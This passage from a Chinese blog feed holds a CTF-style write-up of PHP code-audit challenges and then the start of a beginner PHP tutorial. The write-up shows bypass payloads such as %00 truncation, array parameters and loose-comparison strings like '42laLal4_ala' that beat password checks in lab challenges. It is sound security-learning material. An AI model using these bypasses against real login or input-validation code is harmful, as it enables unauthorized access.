正则表达式匹配<br>ereg函数的漏洞：<br>①%00截断及遇到%00则默认为字符串的结束<br>②当传入的不是字符串而为一个数组时它的返回值不是FALSE，而是NULL</li><li>strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。<h2 id="例题实战-4"><a href="#例题实战-4" class="headerlink" title="例题实战"></a>例题实战</h2><img src="https://img-blog.csdnimg.cn/20200421151507191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>[a-zA-Z0-9]<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符<br>其他的是正则表达式。<br>看代码：<br>这个password必须以数字或者字母开头<br>并且还要在password中检测到<code>--</code>的存在<br>第一种：<br>可以考虑<code>%00</code>截断<br>构造<code>?password=a%00--</code><br>得到flag<br>第二种：<br>考虑数组<br>构造<code>?password[]=--</code><br>得到flag<br>第三种：<br>这个得到flag有点不明白，同样是数组，但是构造<code>?password[]=1</code><br>同样得到flag。看了大佬的博客知道可以这样得到flag，但是具体原因，不晓得。<br>结果：<br><img src="https://img-blog.csdnimg.cn/20200421155133939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h1><h2 id="题中了解相关知识"><a href="#题中了解相关知识" class="headerlink" title="题中了解相关知识"></a>题中了解相关知识</h2><img src="https://img-blog.csdnimg.cn/20200421160437410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：<br>三元运算符判断传入的是不是一个数字，是返回no mumeric(不是数字)，否返回NULL。<br>再判断传入的是否大于1336.，大于就打印flag。<br>我想的是构造<code>?password=2587abc</code><br>这样它既不是一个数字又大于1336.应该是可以打印出flag的。<br>第二种，<br>代码本来自身矛盾，但是PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。可以通过数组绕过。<br>构造<code>?password[]=a</code>两种方法都可以得到flag<br><img src="https://img-blog.csdnimg.cn/20200421162350344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="刷题（随便记一下）"><a href="#刷题（随便记一下）" class="headerlink" title="刷题（随便记一下）"></a>刷题（随便记一下）</h1>一、十六进制与数字比较</li></ul><p>十六进制与数字比较，参考bugku的一道题，代码还是比较简单的，代码还是有矛盾，要想办法绕过，有一点记住就行了<strong>php在转码时会把16进制转化为十进制</strong>，所以在构造payload的时候将数字转换为十六进制的就行了。<br>这个还有就是可以数组绕过，直接构造数组就可以绕过。也没什么需要注意的。</p><p>二、数字验证正则绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'flag&#123;test&#125;'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"POST"</span> <span class="token operator">==</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">>=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^[[:graph:]]&#123;12,&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//preg_match — 执行一个正则表达式匹配</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">></span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ps</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'punct'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'digit'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'upper'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'lower'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ps</span> <span class="token keyword">as</span> <span class="token variable">$pt</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[[:<span class="token interpolation"><span class="token variable">$pt</span></span>:]]+/"</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$c</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//>=3，必须包含四种类型三种与三种以上</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"42"</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Wrong password'</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>源码给出，一点一点看，先看打印flag的地方，<br><img src="https://img-blog.csdnimg.cn/20200425222005483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>[:graph:]</code>是代表printable and visible的字符,是除空格符(空格键与[TAB]键)之外的所有按键,<br>控制字符不算[:graph:]<br>然后这个意思是匹配的password的长度要大于12，这里我用<code>lalalalalalala</code>，<br>然后继续看<br><img src="https://img-blog.csdnimg.cn/20200425222239924.png" alt="Augenstern" loading="lazy"><br><code>[:punct:]</code>是匹配这些特殊字符</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token operator">!</span>"#$%<span class="token operator">&amp;</span>'<span class="token punctuation">(</span><span class="token punctuation">)</span>*+, <span class="token punctuation">\</span>-./:<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">=</span><span class="token operator">></span>?@ <span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">]</span>^_`<span class="token punctuation">&#123;</span><span class="token operator">|</span><span class="token punctuation">&#125;</span>~<span class="token punctuation">]</span></code></pre><p><code>[:digit:]</code>是匹配<code>0-9</code>的数字<br><code>[:upper:]</code>是匹配大写字母<code>A-Z</code><br><code>[:lower:]</code>是匹配小写字母<code>a-z</code><br>关于正则匹配的一些知识参考<a href="https://www.cnblogs.com/Jordandan/p/11211729.html">大佬博客</a></p><p>所以这一句的意思是password里还要匹配到数字、字符、大写和小写字母。<br>我这里将上面的payload改一下<code>lalaLal4_ala</code><br>继续<br><img src="https://img-blog.csdnimg.cn/20200425223245324.png" alt="Augenstern" loading="lazy"><br>这里提示已经有了 ，必须包含四种类型三种与三种以上<br>上面的payload已经符合要求。<br><code>&quot;42&quot;==$password</code>这个是个弱类型比较数字大小，只要前两位是数字，后面的字母在进行比较时会被强行转换成数字来比较，这里相等，所以我再把payload改一下，<code>42laLal4_ala</code>就可以绕过了吧，试一下。<br>还有一点就是，题目上的请求方式是post方式，所以这里抓一下包进行修改<br><img src="https://img-blog.csdnimg.cn/20200425224347421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到flag<br>最后这两题原本也是要详细的写一下知识了解的，后来想想还是不写了，过于啰嗦了。 继续学习加油。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(1)</title>
      <link href="/posts/993a14cd/"/>
      <url>/posts/993a14cd/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP介绍"><a href="#PHP介绍" class="headerlink" title="PHP介绍"></a>PHP介绍</h1><p>PHP的强大功能：<br>1、运行在服务器端：学会了PHP，就可以指挥服务器给你干活，甚至是搞破坏^_^（千万不能真这么做咯），WEB网站的大部分数据都是存储在服务器端的，PHP就是用来处理这些存储在服务器的数据的（功能强大吧）。</p><p>2、跨平台：服务器可以是多种平台的服务器，比如Linux、Windows、Unix，你都可以指挥（不用怕只能指挥一种服务器啦吧）。</p><p>3、脚本语言：它是通过编写脚本，也就是一行行的计算机指令（也可以理解为特定的英文单词），来指挥服务器来工作的，因此，在编写PHP的过程其实就是与老外（服务器成老外啦）交流的过程，交流的语言就是PHP。</p><p>4、免费：免费使用（天下还真有免费的午餐）。</p><h2 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h2><p>编写PHP代码，写PHP代码很简单，就是一行简单的代码。例如下面这个样子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">echo</span><span class="token double-quoted-string string">"大家一起来学习PHP！"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>还可以写成一行代码。注：单引号和双引号都可以。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"大家一起来学习PHP！"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token single-quoted-string string">'大家一起来学习PHP！'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>效果一样<br>PHP代码可以像JavaScript一样插在HTML里</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>php语法<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>      <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> php代码<span class="token punctuation">;</span><span class="token delimiter important">?></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>但注意后面的<code>?&gt;</code>是可以省略的。<br>字符串：在PHP中可以直接通过echo输出字符串。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hi php!"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//还可以这么连接两个字符串<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hi"</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>PHP里可以用<code>.</code>（英文输入法里的句号也就是——点）来连接两个字符串。还有上面的代码里应该看到了我的注释了，对就是双斜扛<code>//</code>这个是PHP里的注释符。<br>基础了解后就正式开始知识点</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是用于存储值的，我们命令服务器去干活的时候，往往需要产生一些数据，需要临时性存放起来，方便取用。我们也可以理解为，变量就像一个购物袋，我们可以用来装苹果、榴莲（当然也可以用来装玫瑰），需要注意的是，一般情况下一个变量只能装一个（不要太贪心）值。然后用一个代码来看看怎么定义变量的：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"欢迎来到我的博客："</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$var</span><span class="token punctuation">;</span>   <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"https://zxcv0221.github.io"</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以看出变量名需要用”美金”来标识，变量命名也是有规则的：<br><img src="https://img-blog.csdnimg.cn/20200314145633274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="摘自慕课网：自学的好地方" loading="lazy"></p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><h4 id="普通可变变量"><a href="#普通可变变量" class="headerlink" title="普通可变变量"></a>普通可变变量</h4><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，就是可以使用两个美元符号，使一个变量成为一个可变变量。比如</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token single-quoted-string string">'hello'</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span> <span class="token single-quoted-string string">'world'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$a</span></span> $<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$a</span></span> <span class="token interpolation"><span class="token variable">$hello</span></span>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>代码跑出来，打印出两个<code>hello world</code></p><h4 id="可变变量用于数组"><a href="#可变变量用于数组" class="headerlink" title="可变变量用于数组"></a>可变变量用于数组</h4><p>讲可变变量用于数组要解决一个问题，就是当写下代码<code>$$a[1]</code>的时候，解析器需要知道我们是想让<code>$a[1]</code>作为一个变量呢还是让<code>$$a</code>作为一个变量并且取出该变量中索引为[1]的值。<br>解决办法：对于第一种情况写成<code>$&#123;$a[1]&#125;</code>即可。第二种情况写成<code>$&#123;$a&#125;[1]</code></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>PHP的数据类型也分为：整型、浮点型、字符串类型、布尔类型等等不同的数据类型所占的“地盘”也不一样。可以通过这样一个函数来查看数据所占空间的大小。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$m1</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token comment">//这是换行符</span><span class="token variable">$var_string</span><span class="token operator">=</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$m2</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$n</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$m3</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token operator">-</span><span class="token variable">$m2</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token number">123.00</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$m4</span> <span class="token operator">=</span> <span class="token function">memory_get_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token variable">$m1</span><span class="token operator">-</span><span class="token variable">$m2</span><span class="token operator">-</span><span class="token variable">$m3</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314150732708.png" alt="在这里插入图片描述" loading="lazy"><br>然后第一行是初始化所消耗的内存，下面的话，就是要减去初始化所占的内存就能看出来这个数据所占的内存了。<br>输出数据类型：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"就是就是"</span><span class="token punctuation">;</span>      <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span>      <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token number">9494</span><span class="token punctuation">;</span>      <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314152024397.png" alt="在这里插入图片描述" loading="lazy"><br>布尔类型就是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$man</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"男"</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$man</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"男"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314153408607.png" alt="在这里插入图片描述" loading="lazy"><br>判断是否满足条件的时候，是用“true”表示满足，用“false”表示不满足。注意，当用”echo”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。<br>浮点型</p><ol><li>正常格式输入就可以，<br>2.输入小写e或者大写E就可以用科学计数法来<br>表示;而<code>+</code> <code>- </code> 号也不是加减<br><img src="https://img-blog.csdnimg.cn/20200314153841931.png" alt="在这里插入图片描述" loading="lazy"><br>整型：可以用八进制、十进制、十六进制指定；<br>字符串：<br>如果需要输出双引号或者单引号怎么办？有两种方法：</li><li>单引号里嵌套双引号或者双引号里嵌套单引号。</li><li>使用转义字符<code>\</code>。<br><img src="https://img-blog.csdnimg.cn/20200314154940880.png" alt="在这里插入图片描述" loading="lazy"><br>当输出时，引号遇到了<code>美元</code></li></ol><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$love</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"I love you!"</span><span class="token punctuation">;</span> <span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"PHP,<span class="token interpolation"><span class="token variable">$love</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'PHP,$love'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$string1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$string2</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200314155343449.png" alt="在这里插入图片描述" loading="lazy"><br>总结：<br>当双引号中包含变量时，变量会与双引号中的内容连接在一起；</p><p>当单引号中包含变量时，变量会被当做字符串输出。<br>输出长字符串比如一首歌或者诗。<br>首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符GOD，然后是字符串，最后以提供的这个标识符结束字符串。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$string1</span><span class="token operator">=</span><span class="token heredoc-string string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>GOD</span>我有一只小毛驴，我从来也不骑。有一天我心血来潮，骑着去赶集。我手里拿着小皮鞭，我心里正得意。不知怎么哗啦啦啦啦，我摔了一身泥.<span class="token delimiter symbol">GOD<span class="token punctuation">;</span></span></span><span class="token keyword">echo</span> <span class="token variable">$string1</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标识符可以随便用，随便一个单词或者字母都可以，保证前后保持一致就OK。结尾的一行除了标识符和<code>;</code>不能有其他的符号，空格也不行。<br>特殊类型：<br>NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//禁止显示PHP警告提示</span> <span class="token variable">$var</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$var1</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$var1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$var2</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token variable">$var2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$var3</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"节日快乐！"</span><span class="token punctuation">;</span> <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$var3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$var3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>unset()</code>函数可以释放被赋值后的变量。释放后变量就跟没赋值一样。类型就会变成NULL。</p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="常量的定义"><a href="#常量的定义" class="headerlink" title="常量的定义"></a>常量的定义</h2><p>什么是常量？常量可以理解为值不变的量（如圆周率）；或者是常量值被定义后，在脚本的其他任何地方都不可以被改变。PHP中的常量分为自定义常量和系统常量。<br>自定义常量：<br>自定义常量是根据我们开发的需要，而定义的常量，它通过使用PHP中的函数define()定义。</p><pre class="language-php" data-language="php"><code class="language-php">bool <span class="token function">define</span><span class="token punctuation">(</span>string <span class="token variable">$constant_name</span><span class="token punctuation">,</span> mixed <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">$case_sensitive</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>它有三个参数，第一个参数“constant_name”为必选参数，常量名称,即标志符，常量的命名规则与变量的一致，但是要注意哦，它可不带美元符号<br>第二个参数“value”为必选参数，它是常量的值。<br>第三个参数“case_sensitive”为可选参数，指定是否大小写敏感，设定为true表示不敏感，一般不指定第三个参数的情况下，默认第三个参数的值为false。如<code>define(&quot;PI&quot;,3.14);</code></p><h2 id="常量的作用："><a href="#常量的作用：" class="headerlink" title="常量的作用："></a>常量的作用：</h2><p>常量主要功效是可以避免重复定义，篡改变量值。在我们进行团队开发时，或者代码量很大的时候，对于一些第一次定义后不改变的量，如果我们使用变量，在不知情的情况下，使用同一变量名时，变量值就会被替换掉，从而会引发服务器执行错误的任务。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"面积为:"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token constant">PI</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"周长为:"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token constant">PI</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以重复使用。</p><h2 id="特殊的常量——系统常量"><a href="#特殊的常量——系统常量" class="headerlink" title="特殊的常量——系统常量"></a>特殊的常量——系统常量</h2><p>系统常量是PHP已经定义好的常量，我们可以直接拿来使用<br>（1）<strong>FILE</strong> :php程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。</p><p>（2）<strong>LINE</strong> 